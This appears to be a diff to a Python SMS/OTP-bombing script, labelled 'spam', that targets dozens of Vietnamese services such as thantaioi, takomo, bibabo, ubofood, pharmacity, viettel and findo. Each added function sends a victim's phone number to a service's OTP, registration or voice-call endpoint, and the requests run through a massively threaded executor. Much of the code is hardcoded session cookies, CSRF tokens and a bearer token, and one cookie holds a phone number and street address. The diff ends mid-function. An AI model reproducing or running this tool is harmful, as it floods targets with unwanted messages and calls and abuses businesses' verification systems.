@@ -539,7 +539,72 @@ while True:
 
 #====================================================================================================================================================================
 threading1 = ThreadPoolExecutor(max_workers=int(10000000))
-# 360tv ,winmart,vion,poyeye,alfresco,loship
+def regthantaioi(sdt):
+  headers = {
+    'Host': 'api.thantaioi.vn',
+    #'content-length': '186',
+    'accept-language': 'vi',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json',
+    'accept': '*/*',
+    'origin': 'https://thantaioi.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://thantaioi.vn/user/registration/reg1',
+    #'accept-encoding': 'gzip, deflate, br'
+}
+  data = json.dumps(
+  {"full_name":"Nguyễn Thanh Nam","first_name":"Nam","last_name":"Nguyễn","mobile_phone":"84"+sdt[1:],"target_url":"thantaioi.vn/?utm_source=google&utm_medium=organic&utm_campaign=organic"})
+  response = requests.post('https://api.thantaioi.vn/api/user', data=data,headers=headers).json()
+  
+  global tokenthantaioi
+  tokenthantaioi = response['token']
+  print("\033[1;32m|spam|---->thành công|regthantaioi|")
+def takomo(sdt):
+  headers = {
+    'Host': 'lk.takomo.vn',
+    # 'content-length': '63',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://lk.takomo.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'cookie': '_gcl_au=1.1.1322990889.1691892176; _gid=GA1.2.1712469938.1691892180; _gat_UA-187725374-2=1; _hjFirstSeen=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjRkMTM2YmI3LWMwZTMtNDViYi04Y2RlLWVmZTEwMDNjOTcyMSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5OTEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1691892183149.361720121; _tt_enable_cookie=1; _ttp=rolXX5eW4teiY32zQW6AhD4vgnU; _fw_crm_v=c75bd27f-15ee-4b55-c659-dcb46da7d3e8; _hjSessionUser_2281843=eyJpZCI6IjBkZmZkMTM5LTdkYzYtNTQ1OS04Njg5LTNmYmMwZjg4YjIyNSIsImNyZWF0ZWQiOjE2OTE4OTIxODI5MTAsImV4aXN0aW5nIjp0cnVlfQ==; _ga_K15C064VTW=GS1.2.1691892186.1.1.1691892195.51.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDMzODYwNzI0NQ.AuMP_7aZ-Nzl2IRO_r4s-uc-YPsmrSqJGHqyMw_WMQ8; _gat_UA-187725374-1=1; _ga=GA1.1.2029320197.1691892180; _ga_ZN0EBP68G5=GS1.1.1691892223.1.0.1691892224.59.0.0; _ga_ZBQ18M247M=GS1.1.1691892181.1.1.1691892225.16.0.0; _ga_03H0F9NHEX=GS1.2.1691892225.1.0.1691892226.59.0.0',
+}
+  data = '{"data":{"phone":"sdt","code":"resend","channel":"ivr"}}'.replace('sdt',sdt)
+  response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', headers=headers, data=data).text
+
+def bibabo(sdt):
+  headers = {
+    'Host': 'bibabo.vn',
+    'Connection': 'keep-alive',
+    # 'Content-Length': '64',
+    'Accept': '*/*',
+    'X-Requested-With': 'XMLHttpRequest',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Origin': 'https://bibabo.vn',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://bibabo.vn/user/signupPhone',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'Cookie': '_ui_bi_=eyJpdiI6IkZQNG9kOUZEVHdHRkw1cVBOOTF4Smc9PSIsInZhbHVlIjoibHpjZTlpbEhtN0VNVFhKNFwvS2V3XC85ZTIrUlwvNk5HYU1WdzRYeWpOdmhiaz0iLCJtYWMiOiI1NGQyZmM3NjE4MzE2NzQ3NGMyMjQ4M2FiZTBhN2E3M2EzZTJhMjM5NDJkMzcxZGU4OThiYWJhYmQ1YmFiYjAxIn0%3D; _gid=GA1.2.261767571.1691888491; mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24device_id%22%3A%20%22189ec699ad6ade-0cf9598c634b9f-1a203021-38400-189ec699ad7adf%22%2C%22%24search_engine%22%3A%20%22google%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fwww.google.com%2F%22%2C%22%24initial_referring_domain%22%3A%20%22www.google.com%22%7D; _fbp=fb.1.1691888491341.1918851086; _gat=1; _ga=GA1.1.1813680014.1691888491; _ga_B05J0DJ8VM=GS1.1.1691888492.1.1.1691888493.0.0.0; gaVisitorUuid=cdea3535-e7d1-4fe7-823c-26aaab984e3d; XSRF-TOKEN=eyJpdiI6Iml6b1ROSUZXV1JoQWE5azFNRjRpYVE9PSIsInZhbHVlIjoicEhqODdzbUM1OUZhcW5jZmxzMVlmSjM2VmRVWE5PRTQ1ZE9RcEtub1ZybVJxZU9ZMCtyWGpKTnd2eFFGckJnV2NaWW5IdWpETTdMZWRxU1FHU3lmb3c9PSIsIm1hYyI6ImYwYTRiNTA2N2NjY2VjNDZmYTA1NGNlYzQxOGVjYTU5OWNhNTlmM2I4NmY1Mzc0MjQzNzUyMTNhM2VkOWMyNTYifQ%3D%3D; laravel_session=eyJpdiI6Im1IUUdLRGF0TjlpckljamkyS0ZxdEE9PSIsInZhbHVlIjoiV3JyaWduWmFxclNxcUUyK2FNSnZjMHFqOUJRd01cL1hWY2FcL09oNWtPZWVBUGVFM3VzV0lSSkYxQlREb1krQ1libUxjaXNZTlhqTmc0TnRwWlJjSVwvenc9PSIsIm1hYyI6IjkxZGMxOWRhZThlODMxNmUwMjM5MjBhNWRkY2I1MTA2MWFhNDEzYjllNTllMTEzMDUzNzhjZmM2NTJlOTBjNjgifQ%3D%3D',
+}
+  data = {
+    'phone': f'{sdt}',
+    '_token': '3ekXaZ227m0YVvU8gNY8U3XIBHDT2vTKABg5ZaBS',
+}
+  response = requests.post('https://bibabo.vn/user/verify-phone', headers=headers, data=data).text
+
 def cashbar(sdt):
   headers = {
     'Host': 'api.cashbar.tech',
@@ -563,6 +628,7 @@ def cashbar(sdt):
     'chntoken': '7f38e65de6b47136eaa373feade6cd33',
   }
   response = requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data).json()
+
 def chotot(sdt):
   headers = {
     'Host': 'gateway.chotot.com',
@@ -582,6 +648,7 @@ def chotot(sdt):
   }
   data = '{"phone":"sdt"}'.replace("sdt",sdt)
   response = requests.post('https://gateway.chotot.com/v2/public/auth/send_otp_verify', headers=headers, data=data).json()
+
 def pizzacompany(sdt):
   cookies = {
     '_gcl_au': '1.1.607819339.1691276885',
@@ -615,6 +682,7 @@ def pizzacompany(sdt):
     '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMfbQwvToQkkGuj4TN2sRcEQ1WYLq8FZcCaAf8P9JHU46UhpBthj5H4JH3oJjwi0hx_zMAPEMRGPK6X6QnCzHwfMW_RhUnFUsBEDrss3f32LBDTUcbq9dohqqQZr2VFE9Ns',
   }
   response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data).json()
+
 def onecredit(sdt):
   cookies = {
     'SN5c8116d5e6183': 'vd0peh2340qie49h8hksc6mktb',
@@ -658,6 +726,7 @@ def onecredit(sdt):
     'CSRFToken': '59sZQFn8SF73FiA6bifZRTdRE2Eand5G77e93NDzfiKiRSH3Tbhe4tSdB3yHD2sf',
   }
   response = requests.post('https://oncredit.vn/', params=params, cookies=cookies, headers=headers, data=data).json()
+
 def concung(sdt):
   cookies = {
     'PHPSESSID': 'ij419v9ov5ug09ui6t5v6hul56',
@@ -703,6 +772,7 @@ def concung(sdt):
     'back': 'khach-hang.html',
   }
   response = requests.post('https://concung.com/ajax.html',cookies=cookies, headers=headers,data=data).json()
+
 def y360(sdt):
   headers = {
     'Host': 'y360.vn',
@@ -724,6 +794,7 @@ def y360(sdt):
   response = requests.post('https://y360.vn/api/v1/user/register', data=data, headers=headers).json()
   global valuey360
   valuey360 = response['errors']
+
 def y360rs(sdt):
   headers = {
     'Host': 'y360.vn',
@@ -743,6 +814,7 @@ def y360rs(sdt):
   }
   data = valuey360.encode()
   response = requests.post('https://y360.vn/api/v1/user/resendCode', data=data, headers=headers).json()
+
 def phamacy(sdt):
   headers = {
     'Host': 'api-gateway.pharmacity.vn',
@@ -761,6 +833,7 @@ def phamacy(sdt):
   }
   data = '{"phone":"sdt","referral":""}'.replace("sdt",sdt)
   response = requests.post('https://api-gateway.pharmacity.vn/customers/register/otp', data=data,headers=headers)
+
 def vayvnd(sdt):
   data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
   head = {
@@ -779,6 +852,30 @@ def vayvnd(sdt):
     "accept-encoding":"gzip, deflate, br",
   }
   rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
+
+def ubofood(sdt):
+  headers = {
+    'Host': 'ubofood.com',
+    'Connection': 'keep-alive',
+    # 'Content-Length': '54',
+    'Accept': 'application/json, text/plain, */*',
+    'Cache-Control': 'no-cache',
+    'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU',
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'Origin': 'https://ubofood.com',
+    'X-Requested-With': 'mark.via.gp',
+    'Sec-Fetch-Site': 'same-origin',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://ubofood.com/register',
+    # 'Accept-Encoding': 'gzip, deflate, br',
+    'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+    # 'Cookie': '_gcl_au=1.1.1893195422.1691887985; _ga=GA1.1.920343154.1691887985; _tt_enable_cookie=1; _ttp=W3eMdboFrsZyxJg3xa7ZNN35ySW; _fbp=fb.1.1691887986713.850575362; ubo_trade=%7B%22code%22%3A%22379760000%22%2C%22name%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22email%22%3A%22%22%2C%22phone_number%22%3A%220828215656%22%2C%22address%22%3A%7B%22area%22%3A%7B%22code%22%3A%223%22%2C%22name%22%3A%22Mi%E1%BB%81n%20Nam%22%7D%2C%22city%22%3A%7B%22code%22%3A%2279%22%2C%22name%22%3A%22Th%C3%A0nh%20ph%E1%BB%91%20H%E1%BB%93%20Ch%C3%AD%20Minh%22%7D%2C%22district%22%3A%7B%22code%22%3A%22760%22%2C%22name%22%3A%22Qu%E1%BA%ADn%201%22%7D%2C%22ward%22%3A%7B%22code%22%3A%2226740%22%2C%22name%22%3A%22Ph%C6%B0%E1%BB%9Dng%20B%E1%BA%BFn%20Ngh%C3%A9%22%7D%2C%22text%22%3A%2206%20Th%C3%A1i%20V%C4%83n%20Lung%22%2C%22building%22%3A%22%22%2C%22floor%22%3A%22%22%2C%22apartment_no%22%3A%22%22%7D%2C%22discount%22%3A0%2C%22coordinate%22%3A%7B%22lat%22%3A10.778755%2C%22lng%22%3A106.70528%7D%2C%22status%22%3Atrue%2C%22created_at%22%3A%222022-10-15T08%3A24%3A02.2Z%22%2C%22updated_at%22%3A%222023-06-15T03%3A15%3A26.154Z%22%2C%22updated_by%22%3A%22anhltt%22%2C%22default_pos_code%22%3A%22379760001%22%7D; ubo_token=Bearer%20eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU; _ga_KCGG79N4SY=GS1.1.1691887985.1.1.1691887993.0.0.0; _ga_3PKTQRQF3P=GS1.1.1691887985.1.1.1691888009.36.0.0',
+}
+  data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt',sdt)
+  response = requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data).text
+
 def tamo(sdt):
   data = '{"mobilePhone":{"number":"sdt"}}'.replace("sdt",sdt)
   head = {
@@ -796,6 +893,25 @@ def tamo(sdt):
     "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
   }
   rq = requests.post("https://api.tamo.vn/web/public/client/phone/sms-code-ts",data=data,headers=head).json()
+
+def thantaioi():
+  headers = {
+    'Host': 'api.thantaioi.vn',
+    'accept-language': 'vi',
+    'authorization': 'Bearer ' + tokenthantaioi ,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'accept': '*/*',
+    'origin': 'https://thantaioi.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://thantaioi.vn/user/registration/reg2',
+    # 'accept-encoding': 'gzip, deflate, br',
+    # 'cookie': '_ym_uid=169110846991669337; _ym_d=1691108469; _fw_crm_v=dbfc3e99-4c79-4c24-8854-63cea51ea448; _gid=GA1.2.551830717.1691894331; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.282932599.1691108469; _ga_LN0QPGLCB5=GS1.2.1691894333.3.1.1691894444.0.0.0; _ga_LBS7YCVKY6=GS1.1.1691894332.3.1.1691894445.55.0.0',
+}
+  response = requests.get('https://api.thantaioi.vn/api/user/phone-confirmation-code', headers=headers).text
+
 def meta(sdt):
   data = '{"api_args":{"lgUser":"sdt","act":"send","type":"phone"},"api_method":"CheckExist"}'.replace("sdt",sdt)
   head = {
@@ -813,6 +929,7 @@ def meta(sdt):
     "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
   }
   rq = requests.post("https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1",data=data,headers=head).text
+
 def shopiness(sdt):
   cookies = {
     '_gcl_au': '1.1.713290776.1691278322',
@@ -845,6 +962,7 @@ def shopiness(sdt):
     'refCode': '',
   }
   response = requests.post('https://shopiness.vn/ajax/user', cookies=cookies, headers=headers, data=data).json()
+
 def kiot(phone):
     cookies = {
         'AKA_A2': 'A',
@@ -908,8 +1026,9 @@ def kiot(phone):
         headers=headers,
         data=data,
     ).text
+
 def fpt(phone):
-    requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
+	requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
 def alfrescos(sdt):
   data = '{"phoneNumber":"sdt","secureHash":"33f65da1c264ef7f519149065a600def","deviceId":"","sendTime":1691068424578,"type":2}'.replace("sdt",sdt)
   head = {
@@ -929,6 +1048,7 @@ def alfrescos(sdt):
     "accept-encoding":"gzip, deflate, br",
   }
   rq = requests.post("https://api.alfrescos.com.vn/api/v1/User/SendSms?culture=vi-VN",data=data,headers=head).json()
+
 def poyeye(sdt):
   data= '{"phone":"sdt","firstName":"Nguyen","lastName":"Hoang","email":"Khgf123@gmail.com","password":"1262007gdtg"}'
   data = data.replace("sdt",sdt)
@@ -946,6 +1066,7 @@ def poyeye(sdt):
     "accept-encoding":"gzip, deflate, br",
   }
   rq = requests.post("https://api.popeyes.vn/api/v1/register",data=data, headers=head).json()
+
 def vieon(sdt):
   data = f'phone_number={sdt}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
   head = {
@@ -961,6 +1082,7 @@ def vieon(sdt):
     "accept-encoding":"gzip, deflate, br",
   }
   rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
+
 def tv360(sdt):
   head = {
     "Host":"m.tv360.vn",
@@ -988,10 +1110,12 @@ def winmart(sdt):
     "accept-language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
   }
   rq = requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={sdt}",headers=head).json()
+
 def fptplay(phone):
     Headers = {"Host": "api.fptplay.net","content-length": "89","sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"","accept": "application/json, text/plain, */*","content-type": "application/json; charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Android\"","origin": "https://fptplay.vn","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptplay.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
     Datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
     response = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st\u003dEim9hpobCZPoIoVVokkIDA\u0026e\u003d1681802671\u0026device\u003dChrome(version%253A112.0.0.0)\u0026drm\u003d1", data=Datason, headers=Headers).json()
+
 def funring(sdt):
   data ='{"username": "sdt"}'.replace("sdt",sdt)
   head = {
@@ -1005,6 +1129,7 @@ def funring(sdt):
     "Accept-Language":"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
   }
   rq = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp",data=data,headers=head).json()
+
 def apispam(phone):
   cookies = {
     '_ga': 'GA1.1.1928856259.1691039310',
@@ -1036,12 +1161,14 @@ def apispam(phone):
     'key': 'freekey307',
   }
   response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
+
 def vietid(phone):
     csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
     csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
     Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
     Payload = {"csrf-token": csrf,"account": phone}
     response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers).text
+
 def dkvt(phone):
     cookies = {
         'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
@@ -1075,6 +1202,7 @@ def dkvt(phone):
     }
 
     response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).text
+
 def viettel(phone):
     cookies = {
         'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
@@ -1115,6 +1243,7 @@ def viettel(phone):
     }
 
     response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data).text
+
 def appota(sdt):
   headers = {
     'Host': 'vi.appota.com',
@@ -1136,6 +1265,28 @@ def appota(sdt):
     'phone_number': f'{sdt}',
   }
   response = requests.post('https://vi.appota.com/check-phone-register.html',data=data,headers=headers).text
+
+def itaphoa(sdt):
+  headers = {
+    'Host': 'api.itaphoa.com',
+    'region-code': 'HCM',
+    'accept': 'application/json',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'origin': 'https://shop.mioapp.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'cross-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://shop.mioapp.vn/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+}
+  params = {
+    'phone': f'{sdt}',
+    'type': 'call',
+}
+  response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers).text
+
 def ghn(sdt):
   headers = {
     'Host': 'online-gateway.ghn.vn',
@@ -1155,6 +1306,7 @@ def ghn(sdt):
   }
   data = '{"phone":"sdt","type":"register"}'.replace("sdt",sdt)
   response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, data=data).json()
+
 def best_inc(sdt):
   headers = {
     'Host': 'v9-cc.800best.com',
@@ -1180,6 +1332,7 @@ def best_inc(sdt):
   }
   data = '{"phoneNumber":"sdt","verificationCodeType":1}'.replace("sdt",sdt)
   response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode',data=data,headers=headers).text
+
 def sapo(sdt):
   headers = {
     'Host': 'www.sapo.vn',
@@ -1202,6 +1355,96 @@ def sapo(sdt):
   }
   response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
 
+def findo(sdt):
+  headers = {
+    'Host': 'api.findo.vn',
+    # 'content-length': '39',
+    'accept': 'application/json, text/plain, */*',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
+    'content-type': 'application/json;charset=UTF-8',
+    'origin': 'https://www.findo.vn',
+    'x-requested-with': 'mark.via.gp',
+    'sec-fetch-site': 'same-site',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-dest': 'empty',
+    'referer': 'https://www.findo.vn/',
+    # 'accept-encoding': 'gzip, deflate, br',
+    'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+}
+  data = '{"mobilePhone":{"number":"sdt"}}'.replace('sdt',sdt)
+  response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, data=data).text
+
+def beecow(sdt):
+  headers = {
+    'Host': 'api.beecow.com',
+    # 'content-length': '138',
+    'content-type': 'application/json; text/plain',
+    'accept': 'application/json, text/plain, application/stream+json',
+    'ati': '1467350218617',
+    'platform': 'WEB',
